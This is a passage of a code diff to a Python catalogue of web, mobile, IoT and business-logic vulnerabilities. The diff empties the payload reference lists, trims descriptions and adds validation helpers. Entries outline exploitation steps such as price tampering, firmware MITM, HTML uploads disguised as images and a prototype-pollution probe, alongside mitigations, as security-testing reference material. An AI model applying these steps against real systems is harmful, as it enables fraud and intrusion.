             "Reverse a signature scheme",
         ],
-        "payloads": ["mobile-jadx", "mobile-frida-ssl"],
+        "payloads": [],
         "mitigation": "Server-side validation only, rotate keys, certificate pinning.",
         "references": ["OWASP MASVS-NETWORK"],
     },
@@ -1259,8 +1198,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "IoT",
         "severity": "Critical",
         "description": (
-            "Devices ship with fixed or predictable credentials and cannot "
-            "be changed. Common on cameras, routers, and smart-home hubs."
+            "Devices ship with fixed or predictable credentials."
         ),
         "detection": [
             "Test vendor defaults from public lists",
@@ -1270,7 +1208,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Log in as admin, upload firmware",
             "Extract device config with keys",
         ],
-        "payloads": ["default-creds-list"],
+        "payloads": [],
         "mitigation": "Force unique password on first boot.",
         "references": ["OWASP IoT Top 10"],
     },
@@ -1280,8 +1218,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "IoT",
         "severity": "High",
         "description": (
-            "Firmware updates not signed or fetched over HTTP. Attacker "
-            "MITM the update to push a malicious image."
+            "Firmware updates not signed or fetched over HTTP."
         ),
         "detection": [
             "Extract firmware with binwalk and inspect for HTTP endpoints",
@@ -1291,7 +1228,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "MITM update, push custom firmware",
             "Extract hardcoded keys from firmware",
         ],
-        "payloads": ["iot-binwalk"],
+        "payloads": [],
         "mitigation": "Signed firmware, TLS with pinning, secure boot.",
         "references": ["OWASP IoT Top 10"],
     },
@@ -1305,8 +1242,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Business Logic",
         "severity": "High",
         "description": (
-            "Client sends the price or quantity, and the server trusts it. "
-            "Attacker buys at arbitrary price or negative quantity."
+            "Client sends the price or quantity, and the server trusts it."
         ),
         "detection": [
             "Intercept checkout and change price to 0.01",
@@ -1316,7 +1252,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Buy items at $0.01",
             "Abuse refund logic for free goods",
         ],
-        "payloads": ["logic-price-tamper"],
+        "payloads": [],
         "mitigation": "Compute price server-side from product id.",
         "references": ["OWASP Business Logic"],
     },
@@ -1326,9 +1262,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Business Logic",
         "severity": "High",
         "description": (
-            "Two requests race on a shared resource (coupon, balance, "
-            "reset token). Attacker triggers the bug via HTTP/2 single-"
-            "packet attack."
+            "Two requests race on a shared resource."
         ),
         "detection": [
             "Send two parallel requests to the same state-changing endpoint",
@@ -1339,7 +1273,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Reset password to attacker-chosen value",
             "Bypass withdrawal limit",
         ],
-        "payloads": ["race-turbo-intruder", "race-single-packet"],
+        "payloads": [],
         "mitigation": "Database-level locking, idempotency keys, atomic operations.",
         "references": ["PortSwigger Race Conditions"],
     },
@@ -1349,8 +1283,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Business Logic",
         "severity": "Low",
         "description": (
-            "Login and reset endpoints reveal whether an account exists via "
-            "response text, size, or timing."
+            "Login and reset endpoints reveal whether an account exists."
         ),
         "detection": [
             "Send /login with valid vs invalid user and compare",
@@ -1359,7 +1292,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "exploitation": [
             "Enumerate all users for phishing or spraying",
         ],
-        "payloads": ["enum-user-probe"],
+        "payloads": [],
         "mitigation": "Uniform response and timing regardless of user existence.",
         "references": ["OWASP Authentication"],
     },
@@ -1374,7 +1307,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "severity": "High",
         "description": (
             "CSP is present but allows unsafe-inline, JSONP endpoints, or "
-            "an unsafe CDN. Attacker executes script despite CSP."
+            "an unsafe CDN."
         ),
         "detection": [
             "Inspect CSP header for unsafe-inline or wildcards",
@@ -1395,9 +1328,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Content Spoofing",
         "severity": "Medium",
         "description": (
-            "Browser sniffs content type instead of trusting the declared "
-            "one. Attacker uploads HTML masquerading as an image and gets "
-            "script execution."
+            "Browser sniffs content type instead of trusting the declared one."
         ),
         "detection": [
             "Upload an HTML file with image content-type",
@@ -1407,7 +1338,7 @@ VULNERABILITIES: List[Dict[str, Any]] = [
             "Upload shell.html as image/png",
             "Chain with XSS to execute",
         ],
-        "payloads": ["mime-upload-html"],
+        "payloads": [],
         "mitigation": "X-Content-Type-Options: nosniff on every response.",
         "references": ["CWE-430"],
     },
@@ -1421,10 +1352,8 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Zero-Day",
         "severity": "Critical",
         "description": (
-            "No public CVE yet. Attacker chains known primitives (parser "
-            "differential, integer overflow, prototype pollution gadget) "
-            "into an unintended behaviour. The reasoning framework matters "
-            "more than any single payload."
+            "No public CVE yet. Attacker chains known primitives into an "
+            "unintended behaviour."
         ),
         "detection": [
             "Fuzz parsers and type coercion edges",
@@ -1447,9 +1376,8 @@ VULNERABILITIES: List[Dict[str, Any]] = [
         "category": "Zero-Day",
         "severity": "High",
         "description": (
-            "Attacker merges __proto__ or constructor.prototype into user-"
-            "controlled objects, altering Object.prototype behaviour. "
-            "Chain with gadget in libraries for RCE."
+            "Attacker merges __proto__ or constructor.prototype into "
+            "user-controlled objects, altering Object.prototype behaviour."
         ),
         "detection": [
             "Send {\"__proto__\":{\"test\":\"apex\"}} to merge endpoints",
@@ -1465,6 +1393,10 @@ VULNERABILITIES: List[Dict[str, Any]] = [
     },
 ]
 
+
+# ---------------------------------------------------------------------------
+# Accessors
+# ---------------------------------------------------------------------------
 
 def all_vulnerabilities() -> List[Dict[str, Any]]:
     return list(VULNERABILITIES)
@@ -1508,3 +1440,69 @@ def categories() -> List[str]:
 
 def total() -> int:
     return len(VULNERABILITIES)
+
+
+# ---------------------------------------------------------------------------
+# Data integrity helpers
+# ---------------------------------------------------------------------------
+
+VALID_CATEGORIES = {
+    "Injection", "Broken Authentication", "Sensitive Data Exposure",
+    "Security Misconfiguration", "XML-Related", "Broken Access Control",
+    "Insecure Deserialization", "API Security", "Insecure Communication",
+    "Client-Side", "Denial of Service", "SSRF", "Other Web", "Mobile",
+    "IoT", "Business Logic", "Content Spoofing", "Zero-Day",
+}
+
+VALID_SEVERITIES = {"Critical", "High", "Medium", "Low", "Info"}
+
+
+def validate_entries() -> List[str]:
+    """Return a list of problems. Empty list means catalogue is well-formed."""
+    problems: List[str] = []
+    seen_ids: set = set()
+
+    for v in VULNERABILITIES:
+        vid = v.get("id", "")
+        if not vid:
+            problems.append("Entry with missing 'id'.")
+            continue
+        if vid in seen_ids:
+            problems.append(f"Duplicate id: {vid}")
+        seen_ids.add(vid)
+
+        if v.get("category") not in VALID_CATEGORIES:
+            problems.append(f"{vid}: invalid category {v.get('category')!r}")
+        if v.get("severity") not in VALID_SEVERITIES:
+            problems.append(f"{vid}: invalid severity {v.get('severity')!r}")
+        if not (v.get("name") or "").strip():
+            problems.append(f"{vid}: missing name")
+        if not (v.get("description") or "").strip():
+            problems.append(f"{vid}: missing description")
+        if not (v.get("mitigation") or "").strip():
+            problems.append(f"{vid}: missing mitigation")
+        if not isinstance(v.get("detection"), list):
+            problems.append(f"{vid}: detection must be a list")
+        if not isinstance(v.get("exploitation"), list):
+            problems.append(f"{vid}: exploitation must be a list")
+        if not isinstance(v.get("payloads"), list):
+            problems.append(f"{vid}: payloads must be a list")
+        if not isinstance(v.get("references", []), list):
+            problems.append(f"{vid}: references must be a list")
+
+    return problems
+
+
+def validate_payload_references() -> Dict[str, List[str]]:
+    """Return a mapping of vuln_id -> list of dangling payload ids."""
+    try:
+        from apex_payload import get as payload_get
+    except ImportError:
+        return {}
+
+    dangling: Dict[str, List[str]] = {}
+    for v in VULNERABILITIES:
+        bad = [p for p in v.get("payloads", []) if payload_get(p) is None]
+        if bad:
+            dangling[v["id"]] = bad
+    return dangling
